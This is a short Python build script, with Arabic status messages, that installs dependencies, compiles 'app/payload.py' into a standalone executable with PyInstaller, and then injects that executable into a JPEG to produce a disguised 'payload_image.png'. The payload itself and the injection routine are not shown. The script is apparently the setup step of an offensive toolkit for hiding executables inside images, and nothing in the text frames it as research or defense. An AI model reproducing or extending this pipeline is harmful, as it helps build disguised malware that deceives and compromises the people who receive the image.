import os
import subprocess
from app.inject_payload import inject_payload

def setup_environment():
    print("تثبيت المكتبات المطلوبة...")
    subprocess.check_call(['pip', 'install', '-r', 'requirements.txt'])
    print("تم تثبيت المكتبات المطلوبة.")

def create_executable():
    print("تحويل البايلود إلى ملف تنفيذي...")
    subprocess.check_call(['pip', 'install', 'pyinstaller'])
    subprocess.check_call(['pyinstaller', '--onefile', 'app/payload.py'])
    print("تم تحويل البايلود إلى ملف تنفيذي.")

def inject_image():
    input_image = "app/static/images/original.jpg"
    output_image = "app/static/images/payload_image.png"
    payload_file = "dist/payload"
    print("حقن البايلود في الصورة...")
    output = inject_payload(input_image, output_image, payload_file)
    print(f"تم إنشاء الصورة المحقونة: {output}")

if __name__ == "__main__":
    setup_environment()
    create_executable()
    inject_image()
    print("الإعداد مكتمل.")
